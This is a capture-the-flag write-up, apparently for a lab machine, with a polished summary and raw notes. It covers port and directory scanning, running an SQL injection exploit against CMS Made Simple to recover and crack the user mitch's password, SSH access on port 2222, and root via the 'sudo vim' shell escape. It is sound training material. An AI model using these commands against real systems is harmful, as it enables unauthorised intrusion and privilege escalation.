## Initial Scanning and Reconnaissance

1. **Nmap Scan**: Perform a full port scan to identify open ports on the target.
  ```bash
   nmap -p- 10.10.243.54 -T4
  ```
   **Result**: Found three open ports:
   - SSH
   - FTP
   - HTTP

2. **Directory Scanning**:
   - Accessed the HTTP service but found nothing significant in the root directory or `robots.txt`.
   - Started a directory scan using `ffuf`:
     ```bash
     ffuf -u http://10.10.243.54/FUZZ -w /usr/share/wordlists/dirb/big.txt
     ```
   - **Result**: Discovered several directories, including `/simple`.

## Exploiting CMS Made Simple

1. **Identifying CMS**:
   - The `/simple` endpoint revealed the service running **CMS Made Simple**.
   - Searched online and found it is vulnerable to SQL injection.

2. **Exploitation**:
   - Downloaded a Python exploit script and ran it to extract credentials.
     ```bash
     python3 exploit.py -u http://10.10.243.54/simple/
     ```
   - Initial run failed to crack the password. Corrected the command to include a wordlist:
     ```bash
     python3 exploit.py -c -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/best110.txt -u http://10.10.243.54/simple/
     ```
   - **Result**: Obtained credentials:
     ```
     [+] Salt for password found: 1dac0d92e9fa6bb2
     [+] Username found: mitch
     [+] Email found: admin@admin.com
     [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
     [+] Password cracked: secret
     ```

## Gaining Initial Access

1. **SSH Access**:
   - Noticed SSH is running on port 2222 (instead of the default port 22).
   - Accessed the system using the credentials:
     ```bash
     ssh mitch@10.10.243.54 -p 2222
     ```
   - Successfully logged in and retrieved `user.txt`.

## Privilege Escalation

1. **SUID Binary Search**:
   - Searched for SUID binaries:
     ```bash
     find / -perm -4000 -type f 2>/dev/null
     ```
   - Found nothing useful.

2. **Checking User's Sudo Privileges**:
   - Listed `sudo` privileges:
     ```bash
     sudo -l
     ```
   - **Result**: User `mitch` can execute `vim` as root.

3. **Using GTFOBins**:
   - Found a command to escalate privileges using `vim`:
     ```bash
     sudo vim -c ':!/bin/sh'
     ```
   - Checked privileges using `whoami`:
     ```
     root
     ```

4. **Retrieving Root Flag**:
   - Navigated to the root directory and retrieved `root.txt`.

## Conclusion

Successfully exploited the CMS Made Simple service, gained initial access, escalated privileges to root, and completed the CTF.
#### Raw Notes
did a nmap scan for the famous 1000 ports
```bash
nmap -p- 10.10.243.54 -T4
```
got 3 ports open 
- ssh
- ftp
- http
nothing special on the root of the http server, so started a directory scan for the website, robots.txt also does not have anything, 

```bash
ffuf -u http://10.10.243.54/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

got some of the directories in it, one of it is ''/simple" endpoint
got a cms service running over it 
service name: CMS Made simple 
searched for a exploit and got one, it is vulnerable to Sqli
downloaded the python script, and gave it the url of the site
```bash
python3 exploit.py -u http://10.10.243.54/simple/
```

got some creds there
```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
the above is wrong because you have not used the exploit correctly
the below is the correct way i guess
```bash
python3 exploit.py -c -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/best110.txt -u http://10.10.243.54/simple/
```
got the correct creds now
```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

got the cred to ssh tying it now
got into the system using the password
did a mistake there as the default port for ssh is 22 but in our case we have ftp there and ssh at the port 2222
so we need to access it using the following
```bash
 ssh mitch@10.10.243.54 -p 2222
```
got in and got the user.txt file
so now we need something to escalate our privilages
```bash
find / -perm -4000 -type f 2>/dev/null
```
i used this but did not get anything trying another method to get what we can do
we can use the following to see what we can do
```bash
sudo -l
```
we got that the user mitch can use vim, so lets search GTFO Bins for command that will help in the escalation
we got that we can use following command on gtfo bins to get the privilages
```bash
sudo vim -c ':!/bin/sh'
```
checking if we have access with whoami
boom we are root
travesing to the root we get the root.txt 
done we have solved the CTF and do with it